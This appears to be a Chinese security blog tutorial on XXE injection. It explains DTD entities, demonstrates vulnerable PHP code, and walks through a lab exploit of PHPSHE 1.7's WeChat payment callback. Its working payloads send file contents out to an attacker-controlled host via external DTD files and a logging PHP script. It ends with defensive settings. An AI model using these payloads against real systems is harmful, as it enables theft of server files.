---
title: 一次面试引发的XXE学习
tags: 
  - web安全
  - xxe
  - xml外部实体注入
categories: web安全
keywords: 'web安全,xxe,xml,外部实体'
description: 一次面试引发的XXE学习
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747032&t=c7b74bfc2b5a10bcac1cda86889c9cdd
date: 2020-11-05 16:45:44
---

<meta name="referrer" content="no-referrer"/>

> 文章已发布到公众号：广软NSDA安全团队
> 标题：面试某公司渗透岗引发的XXE学习
> 链接：https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA

# 前言

刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。


# XXE
XML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。
通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。

# XML外部实体注入攻击
接下来我将对XML外部实体注入进行拆分解释：
1.XML
       可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）
类似HTML
设计宗旨为传输数据而非显示数据
标签未定义
自我描述性
W3C标准
（总结：XML就是用来存储传输数据的、可以自己发明标签）

2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）
3.注入（所有注入都可以这样定义）：
              1.用户能够控制输入
              2.用户输入的数据被拼接到了原本要执行的代码一起执行

#     标准的XXE攻击payload
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807027-8d35847c-5340-4ef7-8862-b5120c4ca214.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=816&status=done&style=none&width=415)
       XML声明 - 类似PHP的<?php?>、用来声明此为XML
       DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容
       XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用<h1>xxe</h1>表示将xxe作为1级标题加大&加粗字体。（只不过在XML中我们需要自己定义标签的含义）

# 我是这样理解XXE漏洞的：
1、 可以传参XML内容
2、 XML内容会被放到代码中执行
3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作

# 从代码层面出发理解XXE：
PHP中存在一个函数：
simplexml_load_string('XML内容','SimpleXMLElement',LIBXML_NOENT)
作用是将XML转化为对象

![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807365-68cd40c2-5126-406d-a912-dc67650d2ace.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=1450&status=done&style=none&width=415)
这里写段简单的代码看看效果：
1、 在C盘放一个flag.txt文件，内容为this is good flag.
2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出
附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建：
<?php
       $a = '<!DOCTYPE scan [<!ENTITY test SYSTEM "file:///C:/flag.txt">]><scan>&test;</scan>';
       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);
       print($b);
       ?>

是不是没什么感觉呢，那么我修改代码看看：
<?php
       @$a = file_get_contents("php://input");
       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);
       print($b);
       ?>
这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807673-117ec659-7045-43e0-b742-cd1d4b03ddf5.png#align=left&display=inline&height=164&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=1247&status=done&style=none&width=415)
# XXE无回显
现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。
XXE虽然不是通过DNSlog，但是也同样是外带数据。
流程如下：
在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。
具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。
1.xml
              <!ENTITY% all "<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>">%all;
2.php
              <?php file_put_contents("3.txt",$_GET["id"],FILE_APPEND);?>
3.txt
       内容空

# 实战演示：
下面我将以PHPSHE1.7 cms来进行实战讲解
1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807995-b6b408a1-1c2c-42d7-8a3e-d06d5b6da135.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=687&originWidth=1641&status=done&style=none&width=415)
2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( )    ---- json 转 对象/数组）
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808483-5b780c7d-d926-44c6-981a-a02cc1ce5da5.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=1331&status=done&style=none&width=415)
3、 这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808778-ff3a23f4-6fa9-4caa-9c11-8cf42d7f3e2c.png#align=left&display=inline&height=59&margin=%5Bobject%20Object%5D&originHeight=135&originWidth=946&status=done&style=none&width=415)
4、 第二个明显不是了，那就只能看第一个，点击查看代码
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809168-eeeba45c-8bbc-4061-9cd5-87a52e583ca2.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&originHeight=106&originWidth=788&status=done&style=none&width=415)
5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809522-3fdb9992-647f-4dd3-a4d8-513fec09f00b.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=167&originWidth=1035&status=done&style=none&width=415)
6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809899-7219a65d-c02c-4a35-ba44-cec786004556.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1126&status=done&style=none&width=415)
7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810126-a505d447-4590-4ed6-87eb-1c00d48de8af.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=231&originWidth=718&status=done&style=none&width=415)
8、 内容如下：
1.xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.229.1/xxe/2.php?id=%file;'>">%all;
2.php
<?php file_put_contents("3.txt",$_GET["id"],FILE_APPEND);?>
3.txt
内容空
9、 接下来搭建环境，通过phpstudy傻瓜式搭建phpshe网站
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810576-8dffa83a-e1a2-4f82-b199-643e379a0cab.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=888&originWidth=1630&status=done&style=none&width=416)
10、          访问存在漏洞的文件，确定文件是否存在，文件路径：/include/plugin/payment/wechat/notify_url.php
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810985-db91fa42-6f99-4248-a982-bccb78a1ddc3.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&originHeight=449&originWidth=1047&status=done&style=none&width=416)
11、          可以看到，页面空白，说明确实存在这个页面。然后看看这次要获取的内容为服务器网站目录下的flag.txt文件，内容为This is my important data.。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317811565-6239b783-6629-4700-a217-a5245cfd7472.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1201&status=done&style=none&width=416)
12、          接下来开始攻击，抓取该页面的数据包，修改传参方式为post，放上payload
payload：
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW/flag.txt">
<!ENTITY % remote SYSTEM "http://192.168.229.1/xxe/1.xml">
%remote;
%send;
]>
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812027-9555a8ec-3c57-4526-8d5a-9ff888bdb1b7.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=263&originWidth=896&status=done&style=none&width=416)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812280-8c2d2d56-24f7-453b-a597-2cbb522d57ce.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&originHeight=379&originWidth=1043&status=done&style=none&width=415)
13、          放包，回去查看3.txt，发现已经有获取到内容了
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812577-94b84759-c4ae-48c6-b9cc-5104fe517397.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&originHeight=239&originWidth=674&status=done&style=none&width=404)
14、          Base64解密，获取信息
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812955-ffd2d37e-56f8-4fa0-846c-75ffe1365e55.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1350&status=done&style=none&width=416)
# 防御方法：
1.     使用开发语言提供的禁用外部实体的方法
PHP：
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python：
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

2.     过滤关键词：SYSTEM、PUBLIC等
